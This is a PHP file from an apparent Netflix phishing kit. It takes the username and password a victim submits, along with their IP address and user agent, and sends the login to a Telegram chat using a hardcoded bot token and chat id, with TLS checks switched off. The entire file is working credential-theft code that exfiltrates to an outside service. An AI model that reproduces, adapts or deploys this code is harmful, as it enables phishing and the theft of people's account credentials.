<?php

session_start();
include("system.php"); 
include("detect.php"); 


session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('Africa/Cairo');
$date = date('d/m/Y h:i:sa');
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];


$config_token = "5405732055:AAG08gAxMewhSd_Bx7Tlvh-UrwdS2lJD9Ls";
$config_chat = "-716546387";

function callAPI($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
   // EXECUTE:
   $result = curl_exec($curl);
   curl_close($curl);
}

$_SESSION['iduserLoginId'] = $_POST['iduserLoginId'];
$_SESSION['idpassword'] = $_POST['idpassword'];


################

$TELG.= urlencode("	✓ <b>Netflix</b> : ".$ip."\n\n");
$TELG.= urlencode("»<b> USER</b> : ".$_SESSION['iduserLoginId']."\n");
$TELG.= urlencode("»<b> PASS</b> : ".$_SESSION['idpassword']."\n\n");

################

callAPI('https://api.telegram.org/bot'.$config_token.'/sendMessage?chat_id='.$config_chat.'&text='.$TELG.'&parse_mode=html');

################

?>